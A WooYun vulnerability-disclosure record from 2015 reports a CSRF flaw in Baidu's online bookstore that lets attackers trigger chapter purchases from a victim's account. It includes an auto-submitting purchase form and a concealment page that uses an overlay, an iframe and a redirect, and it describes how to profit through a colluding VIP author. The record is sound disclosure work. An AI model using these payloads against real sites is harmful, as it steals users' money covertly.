{"id": 45590, "wybug_id": "wooyun-2015-094946", "wybug_title": "百度书城CSRF涉及敏感操作", "wybug_corp": "百度", "wybug_author": "90Snake", "wybug_date": "2015-02-02 13:00", "wybug_open_date": "2015-03-19 13:02", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： 百度书城CSRF涉及敏感操作 详细说明：  百度书城CSRF涉及敏感操作，可被不法分子利用刷钱   漏洞证明：  1、为了做测试，我自己充值了1块钱  ~~~~(>_<)~~~~  求报销\n\n2、我们随便找一个图书的 VIP章节，发现需要支付，然后我们支付的时候截断\n\n我们发现没有token之类的验证，那么我们来试试可不可以实施CSRF攻击，我们先弄一个表单\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form id=\"post123\" name=\"post123\" action=\"http://kanshu.baidu.com/buybook/buychapter\" method=\"POST\">      <input type=\"hidden\" name=\"autopay\" value=\"1\" />      <input type=\"hidden\" name=\"bkid\" value=\"2014012108280744\" />      <input type=\"hidden\" name=\"crid\" value=\"42\" /><script>        document.getElementById('post123').submit();       </script>    </form>  </body></html>\n3、然后打开\n\n我们发现报错~~~难道不行吗？？我们还是回去看看吧\n\n钱已经扣了~~~那么这样攻击呢，会被发现，攻击者为了实攻击目的达到隐秘的效果，会将此页面放到一个 iframe标签里面，然后设置一个跳转\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>Hacked by Snake </h1></td></tr></tbody></table><!--设置这个伪造页面的文字内容--><meta http-equiv=\"refresh\" content=\"4;url=http://www.baidu.com/\"> <!--设置一个正常的跳转页面！--><title>hacked by Snake</title><iframe src=\"http://127.0.0.1/csrf.html\"></iframe><!--csrf攻击页面的地址！--></html>\n例如，这样就可以当用户打开的时候会出来一个黑色覆盖的页面（攻击者会伪装的更好，这里只是举例），然后不知不觉钱就没了，然后跳转到百度去么，如果有不法分子，找一个书城的作者合作，或者自己想法设法的也加入VIP作者里面，然后通过你们的站内信，评论，贴吧等内部产品，或者其他传播途径，即可实施攻击，成功刷钱~~  个人感觉这个CSRF危害很大，不是鸡肋的，毕竟，CSRF是沉睡的巨人    修复方案：  你们更专业   版权声明：转载请注明来源 90Snake@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-02-02 15:13 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-05 10:15 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @百度  不给来个公仔啥的啊  O(∩_∩)O~~~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}